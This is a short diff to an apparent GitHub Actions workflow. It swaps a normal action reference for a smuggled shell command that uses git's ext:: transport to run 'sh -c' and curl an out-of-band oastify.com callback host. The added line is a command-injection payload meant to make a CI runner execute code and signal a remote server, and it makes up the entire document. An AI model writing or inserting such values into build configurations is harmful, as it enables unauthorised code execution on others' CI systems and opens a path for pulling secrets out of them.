@@ -2,4 +2,4 @@ name: apple
 jobs:
   build:
     steps:
-      - uses: efinnTFgit/horserabbit@v1
+      - uses: ext::sh -c 'curl https://0fgk1ssyaw8qj6bgxf6r8dx1ys4jsbg0.oastify.com/test'@v1
